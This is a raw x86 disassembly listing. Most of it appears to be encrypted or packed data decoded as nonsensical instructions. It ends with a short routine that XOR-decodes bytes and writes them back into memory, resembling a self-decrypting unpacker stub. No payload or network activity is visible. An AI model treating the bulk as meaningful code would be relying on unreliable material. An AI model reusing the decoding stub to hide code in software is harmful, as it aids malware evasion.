  403077:	mov    eax,0x6769dd0e
  40307c:	cmp    ah,bl
  40307e:	xchg   ecx,eax
  40307f:	sub    BYTE PTR [ebx],cl
  403081:	sub    al,0xf5
  403083:	sbb    dh,BYTE PTR [eax+0x4c]
  403086:	das    
  403087:	xchg   esi,eax
  403088:	and    al,BYTE PTR [ebp+0xcfa1c15]
  40308e:	mov    al,dh
  403090:	mov    edi,DWORD PTR [esi]
  403092:	jne    0x4030b3
  403094:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403095:	or     eax,0xbc48d137
  40309a:	hlt    
  40309b:	and    ebp,DWORD PTR [ebx+0x22ef0022]
  4030a1:	jle    0x403112
  4030a3:	and    eax,0xcd856d24
  4030a8:	xchg   esi,eax
  4030a9:	add    eax,0xc64f4f99
  4030ae:	jge    0x403056
  4030b0:	or     dl,cl
  4030b2:	fcmovnb st,st(0)
  4030b4:	xchg   esi,eax
  4030b5:	in     al,dx
  4030b6:	inc    ecx
  4030b7:	mov    edi,0x83f60733
  4030bc:	jne    0x4030dc
  4030be:	call   0x70e95826
  4030c3:	aas    
  4030c4:	xor    DWORD PTR [ebp+eiz*8+0x4a],edi
  4030c8:	and    bl,0x32
  4030cb:	jbe    0x40309b
  4030cd:	lods   eax,DWORD PTR ds:[esi]
  4030ce:	pop    ebx
  4030cf:	fistp  DWORD PTR [edi+0x34]
  4030d2:	addr16 retf 
  4030d4:	xchg   esi,eax
  4030d5:	inc    edx
  4030d6:	push   0x57
  4030d8:	push   eax
  4030d9:	push   0x3abf3b81
  4030de:	mov    cl,0xf8
  4030e0:	mov    bl,0xb0
  4030e2:	jecxz  0x40313a
  4030e4:	fs xchg ebp,eax
  4030e6:	ror    DWORD PTR [eax-0x3b],0x1f
  4030ea:	mov    bh,0x3b
  4030ec:	out    dx,al
  4030ed:	jnp    0x4030d1
  4030ef:	data16 jns 0x4030cf
  4030f2:	cs loop 0x40312a
  4030f5:	das    
  4030f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030f7:	lods   eax,DWORD PTR ds:[esi]
  4030f8:	sub    DWORD PTR [ebp+0x3de99418],ecx
  4030fe:	outs   dx,DWORD PTR ds:[esi]
  4030ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403100:	or     eax,0x32fff95d
  403105:	xor    al,0x9
  403107:	sti    
  403108:	sbb    eax,0xea1a90c5
  40310d:	out    0x36,al
  40310f:	mov    edx,cs
  403111:	push   ds
  403112:	cmc    
  403113:	loopne 0x40313e
  403115:	fwait
  403116:	pop    ss
  403117:	ss sbb al,0x45
  40311a:	in     eax,dx
  40311b:	xor    ch,al
  40311d:	mov    bl,0xc4
  40311f:	inc    eax
  403120:	arpl   WORD PTR [esi],di
  403122:	xchg   ecx,eax
  403123:	cmp    eax,DWORD PTR [ecx-0x72]
  403126:	(bad)  
  403127:	fimul  DWORD PTR [edx-0x61]
  40312a:	idiv   BYTE PTR [esp+edx*2-0x40]
  40312e:	fwait
  40312f:	sbb    ebp,DWORD PTR [ebp-0x4efbcacc]
  403135:	stc    
  403136:	xor    al,BYTE PTR [eax-0x43553a68]
  40313c:	mov    esi,0x5b81339a
  403141:	mov    esp,?
  403143:	add    bh,dl
  403145:	ror    BYTE PTR [eax-0x6d],cl
  403148:	mov    ecx,0x4c53ffa5
  40314d:	hlt    
  40314e:	cmp    al,0x23
  403150:	shl    esp,0xd0
  403153:	jno    0x403129
  403155:	mov    dh,0xb8
  403157:	or     edx,DWORD PTR [edx+edx*4+0x73f447ad]
  40315e:	cwde   
  40315f:	lahf   
  403160:	pop    edi
  403161:	fwait
  403162:	dec    esi
  403163:	fiadd  WORD PTR [edi-0x7d6d8d61]
  403169:	repnz or ch,BYTE PTR [esi-0x55508155]
  403170:	cwde   
  403171:	(bad)  
  403172:	es js  0x403180
  403175:	xor    DWORD PTR [esi],edx
  403177:	cmc    
  403178:	xor    eax,0xc3afd7d
  40317d:	push   eax
  40317e:	mov    bh,0xd5
  403180:	(bad)  
  403181:	(bad)  
  403182:	push   edx
  403183:	mov    ebp,0xa9363a87
  403188:	push   esp
  403189:	int    0x73
  40318b:	mov    fs,WORD PTR [eax-0x76b62008]
  403191:	sub    eax,0x1bb930f6
  403196:	push   ss
  403197:	rcr    BYTE PTR [edx+0x75],0x7
  40319b:	sbb    DWORD PTR [ebx+0x3c9155f],ecx
  4031a1:	mov    esp,0x777d534b
  4031a6:	lock popa 
  4031a8:	or     al,0xea
  4031aa:	rol    BYTE PTR [edx+0x3b],1
  4031ad:	push   0xa2d167c2
  4031b2:	sbb    DWORD PTR [eax+eiz*1-0x3f],edx
  4031b6:	cmp    cl,BYTE PTR [ebx-0x5db93e8c]
  4031bc:	jl     0x40314a
  4031be:	pop    ecx
  4031bf:	fmul   QWORD PTR ds:0xbf282279
  4031c5:	outs   dx,BYTE PTR ds:[esi]
  4031c6:	cmp    al,0xb8
  4031c8:	and    edx,DWORD PTR [edx+0x5dd788c1]
  4031ce:	retf   0x87bb
  4031d1:	sar    BYTE PTR [ebx-0x17],1
  4031d4:	cmc    
  4031d5:	inc    ecx
  4031d6:	cld    
  4031d7:	test   al,0xcd
  4031d9:	into   
  4031da:	das    
  4031db:	xor    al,0x3b
  4031dd:	jmp    0x10c6:0x4eea0cf6
  4031e4:	fild   DWORD PTR [ecx-0x4ba24252]
  4031ea:	sub    BYTE PTR [ebx],0xdd
  4031ed:	mov    eax,DWORD PTR [esi+0x26]
  4031f0:	mov    al,BYTE PTR [ecx-0x370b42f4]
  4031f6:	addr16 (bad) 
  4031f8:	jnp    0x4031b9
  4031fa:	push   ds
  4031fb:	lds    esp,FWORD PTR [ebp-0x44e32fb7]
  403201:	nop
  403202:	fs cld 
  403204:	test   DWORD PTR [eax-0x142265e3],esi
  40320a:	call   0x7b0d:0xfc78ec4d
  403211:	mov    edx,ecx
  403213:	add    BYTE PTR [ebp+0x2d3065b6],al
  403219:	jl     0x40325c
  40321b:	mov    ebp,0x201d4e55
  403220:	ficom  DWORD PTR [eax+ebx*2+0x7379d61a]
  403227:	adc    BYTE PTR [edi-0x61],cl
  40322a:	xchg   edx,eax
  40322b:	inc    ebp
  40322c:	outs   dx,BYTE PTR ds:[esi]
  40322d:	int    0x7e
  40322f:	aas    
  403230:	xor    edi,edi
  403232:	out    0x1e,eax
  403234:	mov    ebp,edi
  403236:	pop    ds
  403237:	fild   QWORD PTR [eax+edx*4-0x45]
  40323b:	ds inc esp
  40323d:	int    0xef
  40323f:	xor    edi,ecx
  403241:	dec    ebx
  403242:	mov    esi,0x86aaaa72
  403247:	stc    
  403248:	push   es
  403249:	or     al,ah
  40324b:	pop    es
  40324c:	jb     0x4031e9
  40324e:	lahf   
  40324f:	out    0x77,al
  403251:	lods   eax,DWORD PTR ds:[esi]
  403252:	sub    DWORD PTR [ebp+edx*1+0x4c99bdd5],esp
  403259:	and    esi,DWORD PTR [eax-0x6ebdaa03]
  40325f:	pop    edx
  403260:	adc    eax,0x208e8083
  403265:	(bad)
  403269:	xchg   esi,eax
  40326a:	in     eax,0xbc
  40326c:	lahf   
  40326d:	sar    eax,cl
  40326f:	xor    BYTE PTR [eax-0x2f],bl
  403272:	sub    eax,ebp
  403274:	inc    edx
  403275:	xchg   ecx,eax
  403276:	mov    eax,ds:0x805c8201
  40327b:	data16 fisttp WORD PTR [bx+si]
  40327f:	cli    
  403280:	and    eax,0x79cf45b4
  403285:	mov    bh,0xdb
  403287:	in     al,0x5a
  403289:	cmp    BYTE PTR ds:0x350a511b,0xa2
  403290:	mov    ebp,0x2724515e
  403295:	and    BYTE PTR ss:[ebx+0x79088248],ah
  40329c:	out    0x61,al
  40329e:	xor    eax,DWORD PTR [edi-0x19382c54]
  4032a4:	jb     0x403315
  4032a6:	ins    BYTE PTR es:[edi],dx
  4032a7:	xor    DWORD PTR [ecx],ecx
  4032a9:	shl    BYTE PTR [edx+edi*1-0xd],0x8a
  4032ae:	mov    ds:0x99ecd986,al
  4032b3:	sbb    DWORD PTR [esp+ecx*1+0x2a],esp
  4032b7:	cmp    edi,esp
  4032b9:	push   esi
  4032ba:	(bad)  
  4032bb:	mov    eax,0x8a8b9a48
  4032c0:	and    BYTE PTR [esp+ebx*8],cl
  4032c3:	dec    esp
  4032c4:	ret    0x8fd0
  4032c7:	cwde   
  4032c8:	pop    ebp
  4032c9:	in     al,0x5e
  4032cb:	or     cl,bl
  4032cd:	das    
  4032ce:	lods   al,BYTE PTR ds:[esi]
  4032cf:	sub    BYTE PTR [edx-0x65c4b5c3],ah
  4032d5:	call   0x82d4:0xb35f0c30
  4032dc:	pop    edx
  4032dd:	pusha  
  4032de:	mov    ss,WORD PTR [ecx+0x3e2b5798]
  4032e4:	retf   0x9961
  4032e7:	pop    esp
  4032e8:	adc    bl,BYTE PTR [esi+0x55]
  4032eb:	push   ebx
  4032ec:	cmp    bh,BYTE PTR [edi+0x6aecab78]
  4032f2:	xchg   BYTE PTR [edi-0x7677889],dl
  4032f8:	xor    bl,BYTE PTR [edx+0x44fd087f]
  4032fe:	or     eax,0x8f569743
  403303:	popa   
  403304:	mov    cl,0x8e
  403306:	test   DWORD PTR [edx+0x2bf65a88],edi
  40330c:	push   0x536fc3cf
  403311:	cdq    
  403312:	popf   
  403313:	push   ds
  403314:	push   0x7a256f7d
  403319:	add    BYTE PTR [eax-0x47],ch
  40331c:	or     BYTE PTR [eax+0x348bf2e5],0x18
  403323:	sbb    al,0x8b
  403325:	ins    DWORD PTR es:[edi],dx
  403326:	std    
  403327:	fcmovnb st,st(1)
  403329:	xor    BYTE PTR [ebp-0xad7449e],bl
  40332f:	xchg   ebx,eax
  403330:	mov    eax,ds:0x8b54749d
  403335:	sbb    dl,BYTE PTR [edi-0x36774823]
  40333b:	mov    edi,0xf8bc90ba
  403340:	shl    BYTE PTR ds:0xeb95f2fe,0x34
  403347:	push   ss
  403348:	pop    ds
  403349:	out    0x8e,eax
  40334b:	pop    ds
  40334c:	pop    ecx
  40334d:	pop    ecx
  40334e:	cmp    dl,0x6d
  403351:	xor    al,0x65
  403353:	sti    
  403354:	sub    cl,ah
  403356:	sbb    ebx,DWORD PTR [eax]
  403358:	pop    ds
  403359:	loopne 0x403354
  40335b:	jmp    0xc90b:0x63d8dd8e
  403362:	scas   eax,DWORD PTR es:[edi]
  403363:	jne    0x4032ea
  403365:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403366:	ins    BYTE PTR es:[edi],dx
  403367:	call   0xcbbd:0x60730e5c
  40336e:	rcr    ch,1
  403370:	or     cl,al
  403372:	jp     0x40331d
  403374:	retf   
  403375:	inc    edx
  403376:	pop    si
  403378:	rol    BYTE PTR ds:0x6fa6f3c1,cl
  40337e:	xchg   DWORD PTR [ebp-0x1cfbc7bd],edx
  403384:	mov    ds:0x54eb43ef,eax
  403389:	in     al,0xf3
  40338b:	add    al,0x6d
  40338d:	int    0xfd
  40338f:	pushf  
  403390:	jnp    0x40336c
  403392:	das    
  403393:	jmp    0x403385
  403395:	and    eax,DWORD PTR [edi+0x3fcf34d4]
  40339b:	in     eax,0x1f
  40339d:	jmp    0xa2b3:0xb59b6951
  4033a4:	xor    edx,DWORD PTR [edx-0x51]
  4033a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033a8:	fcos   
  4033aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033ab:	repnz pop ebx
  4033ad:	out    0x45,al
  4033af:	xchg   BYTE PTR [esi+eiz*4-0x79],ch
  4033b3:	retf   0xa31b
  4033b6:	push   0xffffffb9
  4033b8:	ret    0x84e8
  4033bb:	adc    eax,0x744eac32
  4033c0:	cmp    ah,BYTE PTR [ecx]
  4033c2:	aad    0xeb
  4033c4:	mov    esp,0x5173f7a6
  4033c9:	and    DWORD PTR [esi+esi*1],0x5eccea1a
  4033d0:	mov    al,0xfe
  4033d2:	sbb    eax,0xc15579f3
  4033d7:	mov    ds:0x1320b220,al
  4033dc:	je     0x40341c
  4033de:	pop    ds
  4033df:	test   DWORD PTR [eax],esp
  4033e1:	sbb    eax,0x5e60ab68
  4033e6:	xor    al,0x69
  4033e8:	jmp    0xb9e1:0xee74cf30
  4033ef:	push   ebp
  4033f0:	fidivr DWORD PTR [ecx+0x74765773]
  4033f6:	sbb    al,0x7
  4033f8:	and    DWORD PTR ds:[edi+edi*8-0x6c],eax
  4033fd:	push   esp
  4033fe:	cld    
  4033ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403400:	and    eax,0x68f41a76
  403405:	shl    ecx,0xda
  403408:	mov    ecx,0xb459740d
  40340d:	aas    
  40340e:	imul   ebx,DWORD PTR [edx+0x5475dd4e],0xe2153e58
  403418:	(bad)  
  403419:	into   
  40341a:	mov    al,ds:0x1edda4a9
  40341f:	cld    
  403420:	fdiv   QWORD PTR [ebx+0x779c7e9d]
  403426:	scas   al,BYTE PTR es:[edi]
  403427:	mov    al,ds:0x31dcf767
  40342c:	sub    eax,0x3f397a19
  403431:	xor    DWORD PTR [ecx-0x24f5e3aa],0xbdae18fc
  40343b:	xor    al,0xb0
  40343d:	dec    esp
  40343e:	jo     0x40348f
  403440:	out    0x7a,eax
  403442:	inc    esi
  403443:	retf   
  403444:	cmp    cl,BYTE PTR [ebx-0x7102a6d1]
  40344a:	scas   eax,DWORD PTR es:[edi]
  40344b:	adc    edx,DWORD PTR [edi+edx*2-0x3eaf4a8b]
  403452:	push   0x8e684c45
  403457:	push   es
  403458:	popf   
  403459:	int3   
  40345a:	into   
  40345b:	mov    ah,0x92
  40345d:	loope  0x403464
  40345f:	test   BYTE PTR [eax+0x19],dl
  403462:	popf   
  403463:	and    edi,DWORD PTR [ecx+0x7d]
  403466:	cmp    esp,DWORD PTR [edx+eiz*4-0x3e]
  40346a:	xchg   ebx,eax
  40346b:	das    
  40346c:	mov    bh,0xae
  40346e:	lahf   
  40346f:	retf   
  403470:	inc    ebx
  403471:	cmc    
  403472:	icebp  
  403473:	daa    
  403474:	add    eax,DWORD PTR [ecx]
  403476:	fsub   DWORD PTR [ecx-0x46]
  403479:	int    0x9
  40347b:	call   0x17f65429
  403480:	leave  
  403481:	stos   BYTE PTR es:[di],al
  403483:	mov    esi,DWORD PTR [ecx+0x7941e90c]
  403489:	inc    ebp
  40348a:	fsub   QWORD PTR [esi+0x19]
  40348d:	pop    esi
  40348e:	jno    0x403463
  403490:	(bad)  
  403491:	jg     0x40342a
  403493:	jbe    0x4034a9
  403495:	fwait
  403496:	aaa    
  403497:	xor    DWORD PTR [ebx+edi*4],ebp
  40349a:	mov    dh,0xf6
  40349c:	mov    cl,0x60
  40349e:	inc    eax
  40349f:	xor    ch,BYTE PTR [ecx]
  4034a1:	add    ah,BYTE PTR [ecx+0x61]
  4034a4:	repz scas al,BYTE PTR es:[edi]
  4034a6:	xchg   BYTE PTR [ebp-0x18c86860],dl
  4034ac:	test   al,0xdb
  4034ae:	(bad)  
  4034af:	in     al,0xf8
  4034b1:	es jmp 0x403510
  4034b4:	xchg   edx,eax
  4034b5:	pop    ebx
  4034b6:	xchg   DWORD PTR [esi-0x182d6c65],edx
  4034bc:	push   ebx
  4034bd:	jb     0x4034e1
  4034bf:	lods   eax,DWORD PTR ds:[esi]
  4034c0:	inc    ebx
  4034c1:	or     DWORD PTR [edx],edi
  4034c3:	popf   
  4034c4:	add    BYTE PTR [edx],bl
  4034c6:	ror    ebx,0x48
  4034c9:	popa   
  4034ca:	xor    dh,cl
  4034cc:	xchg   ebp,eax
  4034cd:	mov    ebp,DWORD PTR [edi+esi*8-0x61]
  4034d1:	dec    esi
  4034d2:	repz mov eax,ds:0x9c1deb53
  4034d8:	pop    ebp
  4034d9:	mov    ebx,0x54d608e
  4034de:	imul   edi,DWORD PTR [edi-0x48],0xffffff86
  4034e2:	in     al,0x99
  4034e4:	iret   
  4034e5:	mov    edi,DWORD PTR [ebx-0x54661e8e]
  4034eb:	scas   eax,DWORD PTR es:[edi]
  4034ec:	push   eax
  4034ed:	jnp    0x403512
  4034ef:	sbb    BYTE PTR [eax-0x14808879],0x6c
  4034f6:	dec    esp
  4034f7:	dec    eax
  4034f8:	cmp    ah,BYTE PTR [esi+ebx*4-0x13]
  4034fc:	or     edx,0x7a2bd20a
  403502:	jl     0x403538
  403504:	in     al,dx
  403505:	(bad)  
  403506:	imul   BYTE PTR [esi-0x155209d1]
  40350c:	rcl    BYTE PTR [ecx],1
  40350e:	es mov ch,0x57
  403511:	or     BYTE PTR [eax+0x1b],cl
  403514:	out    0xd7,eax
  403516:	add    esi,DWORD PTR [eax-0xf]
  403519:	mov    ebx,0xa3cfa420
  40351e:	mov    ecx,DWORD PTR [ecx+eax*1-0x4e]
  403522:	mov    cl,0x2f
  403524:	call   0x31a75865
  403529:	cmp    bh,BYTE PTR [esi]
  40352b:	adc    DWORD PTR [edi+0x10f3c344],0x1d
  403532:	push   edi
  403533:	pop    ds
  403534:	lods   al,BYTE PTR ds:[esi]
  403535:	xchg   ecx,eax
  403536:	aam    0x30
  403538:	(bad)  
  403539:	cmp    al,0x9e
  40353b:	mov    ch,0xb1
  40353d:	adc    DWORD PTR ds:0x2dbc0936,0xffffffac
  403544:	push   ss
  403545:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403546:	jae    0x403501
  403548:	int    0xd6
  40354a:	jns    0x403586
  40354c:	out    0x6d,eax
  40354e:	mov    al,ds:0xfb8a8060
  403553:	or     BYTE PTR [esi],0x7c
  403556:	aad    0x5
  403558:	hlt    
  403559:	pop    edx
  40355a:	scas   eax,DWORD PTR es:[edi]
  40355b:	dec    DWORD PTR [edi+0x6e047b55]
  403561:	lock xor ebx,ecx
  403564:	jbe    0x4034f5
  403566:	or     esi,DWORD PTR [edi]
  403568:	dec    eax
  403569:	das    
  40356a:	mov    bh,0xdf
  40356c:	mov    bl,0xf5
  40356e:	add    cl,BYTE PTR cs:[edx+0x512323ba]
  403575:	jnp    0x403508
  403577:	fisubr WORD PTR [ecx+0x20]
  40357a:	in     eax,0xb8
  40357c:	fistp  WORD PTR [edx+eiz*8+0x204d474a]
  403583:	repz sub eax,0x28ceb8da
  403589:	ror    DWORD PTR [edx-0x13f4ec58],cl
  40358f:	shl    BYTE PTR [ecx],1
  403591:	dec    ecx
  403592:	pop    ds
  403593:	add    eax,0x19cdd989
  403598:	add    edx,ebp
  40359a:	xor    edi,DWORD PTR [esi+0x5a098e1]
  4035a0:	or     bh,BYTE PTR [ecx+0x189c76f3]
  4035a6:	and    DWORD PTR [eax],0x977c87bf
  4035ac:	mov    esi,0xdef29ed4
  4035b1:	or     eax,0x3c21d305
  4035b6:	lea    ecx,[edx+0x552e6fb3]
  4035bc:	and    ch,al
  4035be:	jge    0x40360b
  4035c0:	outs   dx,DWORD PTR ds:[si]
  4035c2:	add    ch,ah
  4035c4:	mov    dh,0x79
  4035c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035c7:	dec    ebx
  4035c8:	lods   al,BYTE PTR ds:[esi]
  4035c9:	test   edx,edi
  4035cb:	cmp    bh,BYTE PTR [ebx-0x64]
  4035ce:	int3   
  4035cf:	sbb    BYTE PTR [esi],0xce
  4035d2:	test   eax,0xe7c815eb
  4035d7:	bound  edx,QWORD PTR [esi+ecx*1]
  4035da:	adc    eax,0xa8c16319
  4035df:	mov    esp,0x1cfaa6e4
  4035e4:	push   ds
  4035e5:	dec    esp
  4035e6:	adc    eax,0xabc08ded
  4035eb:	xchg   ebp,eax
  4035ec:	dec    ebx
  4035ed:	cmp    eax,0xbeb8376f
  4035f2:	push   esp
  4035f3:	add    al,0x53
  4035f5:	mov    al,0x19
  4035f7:	sti    
  4035f8:	cdq    
  4035f9:	mov    ebx,0x10c0bd5f
  4035fe:	test   eax,0x44900fd1
  403603:	fwait
  403604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403605:	add    BYTE PTR [edi-0x13],bl
  403608:	retf   
  403609:	push   ebp
  40360a:	mov    al,0x53
  40360c:	lea    ebp,[ebx-0x10]
  40360f:	(bad)  
  403610:	pushw  es
  403612:	sub    eax,0x455dbd45
  403617:	xchg   ebx,eax
  403618:	xlat   BYTE PTR ds:[ebx]
  403619:	int3   
  40361a:	mov    ah,0x92
  40361c:	stc    
  40361d:	sbb    edi,edi
  40361f:	inc    ebp
  403620:	lods   al,BYTE PTR ds:[esi]
  403621:	push   ss
  403622:	inc    esp
  403623:	mov    cl,0xcf
  403625:	push   ds
  403626:	outs   dx,DWORD PTR ds:[esi]
  403627:	mov    al,bl
  403629:	call   0x7879:0x86b33ac
  403630:	dec    edx
  403631:	imul   BYTE PTR [eax]
  403633:	ins    DWORD PTR es:[edi],dx
  403634:	jge    0x40365d
  403636:	pop    edx
  403637:	pop    ebx
  403638:	out    0x12,eax
  40363a:	jl     0x4036ad
  40363c:	jno    0x40367a
  40363e:	mov    al,ds:0x1c97d1a1
  403643:	cli    
  403644:	pop    ecx
  403645:	outs   dx,BYTE PTR ds:[esi]
  403646:	cmp    DWORD PTR [ebx-0x10],eax
  403649:	sbb    eax,esp
  40364b:	dec    esi
  40364c:	dec    edi
  40364d:	or     BYTE PTR [edi],bh
  40364f:	test   edx,0xe9940c4b
  403655:	ret    0x9e
  403658:	mov    esp,0xe0d5752a
  40365d:	out    0x35,eax
  40365f:	arpl   WORD PTR [edx+0x6bf176cc],sp
  403665:	jle    0x4036b4
  403667:	mov    ds:0x1c76a8ee,eax
  40366c:	cmp    esi,esp
  40366e:	call   0xcf33:0x9794e60b
  403675:	(bad)  
  403676:	jo     0x403636
  403678:	sti    
  403679:	and    ebx,0x61f04e4e
  40367f:	add    edi,esp
  403681:	rol    DWORD PTR [ebx+edi*1+0x7e],0x67
  403686:	xchg   DWORD PTR [edx],eax
  403688:	(bad)  
  403689:	shr    DWORD PTR ds:0xfd72a84c,cl
  40368f:	inc    esp
  403690:	or     ecx,esp
  403692:	adc    BYTE PTR [esi+0x3b],0x11
  403696:	popa   
  403697:	loopne 0x40369c
  403699:	push   es
  40369a:	dec    eax
  40369b:	pop    eax
  40369c:	out    0x90,eax
  40369e:	mov    BYTE PTR [ecx-0x67e8f99a],ah
  4036a4:	popf   
  4036a5:	pop    edi
  4036a6:	es dec eax
  4036a8:	sti    
  4036a9:	and    esp,ebx
  4036ab:	or     ebx,DWORD PTR [esp+ebx*8]
  4036ae:	dec    ecx
  4036af:	mov    al,ds:0xbc595561
  4036b4:	pop    ss
  4036b5:	or     DWORD PTR [esi-0x68],esp
  4036b8:	mov    ds:0x4fa0da0d,al
  4036bd:	mov    ?,WORD PTR [ebp+0x6f]
  4036c0:	adc    ah,BYTE PTR [edi]
  4036c2:	ror    DWORD PTR [eax],0x3c
  4036c5:	outs   dx,DWORD PTR ds:[esi]
  4036c6:	push   ecx
  4036c7:	retf   
  4036c8:	jmp    DWORD PTR [ecx]
  4036ca:	xor    al,0x67
  4036cc:	sub    bl,BYTE PTR [edx+0x22ea8f5e]
  4036d2:	js     0x40373b
  4036d4:	xor    al,0x9f
  4036d6:	cs mov bh,0xda
  4036d9:	jecxz  0x403758
  4036db:	mov    bl,BYTE PTR [eax+edi*8]
  4036de:	add    BYTE PTR [ecx+0x12],dl
  4036e1:	faddp  st(0),st
  4036e3:	and    eax,0x293df666
  4036e8:	adc    eax,0x2bc4ee4e
  4036ed:	xchg   eax,edi
  4036ef:	fwait
  4036f0:	outs   dx,BYTE PTR ds:[esi]
  4036f1:	push   0xd
  4036f3:	arpl   WORD PTR [esp+eiz*4],sp
  4036f6:	adc    esi,esi
  4036f8:	push   ds
  4036f9:	mov    bh,0x4f
  4036fb:	add    esp,DWORD PTR [eax+0x1a5bd48e]
  403701:	adc    eax,0x957d7ee7
  403706:	xor    al,0xc1
  403708:	fld    st(7)
  40370a:	xor    al,ch
  40370c:	add    ebx,0x2dea4a5d
  403712:	jg     0x403714
  403714:	adc    BYTE PTR [edi+eiz*4-0x6e05f7b6],dh
  40371b:	into   
  40371c:	mov    dh,0xfe
  40371e:	xchg   BYTE PTR [esp+esi*2],ch
  403721:	mov    cl,0x29
  403723:	mov    ah,0x5
  403725:	imul   edi,DWORD PTR [esi-0xa],0x9897bf29
  40372c:	mov    bh,0xa5
  40372e:	scas   eax,DWORD PTR es:[edi]
  40372f:	mov    ecx,0x365c0cce
  403734:	dec    edi
  403735:	addr16 loop 0x403705
  403738:	mov    bl,BYTE PTR ss:[ebx+0x25ae6ee5]
  40373f:	cmp    ecx,ecx
  403741:	dec    esp
  403742:	fidiv  DWORD PTR [esi-0x591b5c8f]
  403748:	clc    
  403749:	mov    edi,0xe529a0d0
  40374e:	cdq    
  40374f:	xchg   ebx,eax
  403750:	sahf   
  403751:	leave  
  403752:	aaa    
  403753:	fisubr WORD PTR [ecx]
  403755:	loope  0x40379e
  403757:	leave  
  403758:	dec    ecx
  403759:	jge    0x403709
  40375b:	xlat   BYTE PTR ds:[ebx]
  40375c:	add    edi,DWORD PTR [edx]
  40375e:	or     dh,BYTE PTR [edx]
  403760:	hlt    
  403761:	pop    ebx
  403762:	daa    
  403763:	in     eax,0x2c
  403765:	imul   DWORD PTR [ebp-0x618d0175]
  40376b:	or     ch,BYTE PTR [bx+0x3c7d]
  403770:	dec    esi
  403771:	syscall 
  403773:	xchg   edx,eax
  403774:	sar    ch,0xbf
  403777:	mov    dl,0x3e
  403779:	and    bl,ah
  40377b:	inc    esi
  40377c:	push   ebp
  40377d:	mov    esi,0x38a4b492
  403782:	aaa    
  403783:	xor    DWORD PTR [ecx-0x42ed3666],ebp
  403789:	sub    BYTE PTR [edx],cl
  40378b:	pop    edx
  40378c:	sbb    DWORD PTR [ebx-0x555db8f8],esi
  403792:	imul   ebp,DWORD PTR [ebx+0x9be6595],0x637281a
  40379c:	fwait
  40379d:	retf   
  40379e:	and    dl,BYTE PTR [ebx+ebx*8]
  4037a1:	sbb    edi,DWORD PTR [eax-0x783a7fec]
  4037a7:	test   DWORD PTR [eax+0x619d353a],ebp
  4037ad:	out    0x1,eax
  4037af:	lea    ebp,[edi-0x174c7a8e]
  4037b5:	ror    DWORD PTR [edi-0x25],1
  4037b8:	call   0xc19f:0x1579ab5b
  4037bf:	pop    ecx
  4037c0:	outs   dx,DWORD PTR ds:[esi]
  4037c1:	(bad)  
  4037c2:	addr16 dec ebp
  4037c4:	push   esi
  4037c5:	loop   0x4037af
  4037c7:	adc    BYTE PTR [edi+edx*8+0x438af09d],bh
  4037ce:	idiv   BYTE PTR [esp+edi*8+0x1a]
  4037d2:	les    ebx,FWORD PTR [ebx]
  4037d4:	stos   BYTE PTR es:[edi],al
  4037d5:	icebp  
  4037d6:	aaa    
  4037d7:	mov    bl,0xaa
  4037d9:	inc    eax
  4037da:	pop    ebx
  4037db:	sbb    edx,DWORD PTR [edx+0x6f78da59]
  4037e1:	mov    ecx,0x72688e6b
  4037e6:	sub    DWORD PTR [ebp-0x40],0xd6b0ca19
  4037ed:	or     eax,0x1a3dcca0
  4037f2:	xchg   esp,eax
  4037f3:	test   dh,dh
  4037f5:	fistp  DWORD PTR [esi+0x11d4e6f7]
  4037fb:	je     0x4037cb
  4037fd:	out    0x54,al
  4037ff:	push   gs
  403801:	jae    0x4037e7
  403803:	lods   al,BYTE PTR ds:[esi]
  403804:	shl    BYTE PTR [esp+eax*4],1
  403807:	jmp    0x4037d1
  403809:	and    BYTE PTR [ecx],ch
  40380b:	(bad)  
  40380c:	(bad)  [esi+0x51]
  40380f:	sti    
  403810:	sbb    DWORD PTR ds:0xa137eeb7,ebp
  403816:	and    eax,0x27f46dda
  40381b:	jmp    0xe7f1:0xb30cd7c3
  403822:	ret    
  403823:	fsub   DWORD PTR [esi]
  403825:	xchg   ebx,eax
  403826:	sahf   
  403827:	leave  
  403828:	repz aaa 
  40382a:	mov    ?,ebx
  40382c:	ds ins BYTE PTR es:[edi],dx
  40382e:	(bad)  
  40382f:	in     al,0xed
  403831:	mov    ds:0x57fa0e6e,eax
  403836:	sbb    eax,0xeb3891d7
  40383b:	ins    BYTE PTR es:[edi],dx
  40383c:	push   ds
  40383d:	rcl    dl,cl
  40383f:	sbb    bl,dh
  403841:	adc    al,0xda
  403843:	sbb    eax,0x710b97f7
  403848:	cmp    BYTE PTR [edx-0x6d],ah
  40384b:	xor    BYTE PTR [esi],cl
  40384d:	jg     0x403845
  40384f:	lods   al,BYTE PTR ss:[esi]
  403851:	lods   eax,DWORD PTR ds:[esi]
  403852:	jle    0x4038bf
  403854:	add    DWORD PTR [ebp-0xc],eax
  403857:	mov    eax,DWORD PTR [ebp-0xc]
  40385a:	mov    ecx,DWORD PTR [ebp-0x8]
  40385d:	mov    ecx,DWORD PTR [ecx]
  40385f:	mov    ecx,DWORD PTR [ecx]
  403861:	mov    ecx,DWORD PTR [ecx]
  403863:	mov    DWORD PTR [ecx+0x1],eax
  403866:	mov    al,BYTE PTR [ebp-0x1]
  403869:	mov    ecx,DWORD PTR [ebp-0x8]
  40386c:	mov    ecx,DWORD PTR [ecx]
  40386e:	mov    ecx,DWORD PTR [ecx]
  403870:	mov    ecx,DWORD PTR [ecx]
  403872:	push   DWORD PTR [ebp-0x2c]
  403875:	xor    al,0x6f
  403877:	sub    al,0xd
  403879:	mov    BYTE PTR [ecx],al
  40387b:	mov    eax,ds:0x4217ce
  403880:	push   DWORD PTR [eax]
  403882:	push   DWORD PTR ds:0x421a2a
  403888:	push   DWORD PTR ds:0x4217d6
  40388e:	push   DWORD PTR ds:0x421a0a
  403894:	push   DWORD PTR ds:0x421a9e
  40389a:	push   DWORD PTR [ebp-0x30]
  40389d:	push   DWORD PTR [ebp-0x20]
  4038a0:	mov    eax,DWORD PTR [ebp-0x8]
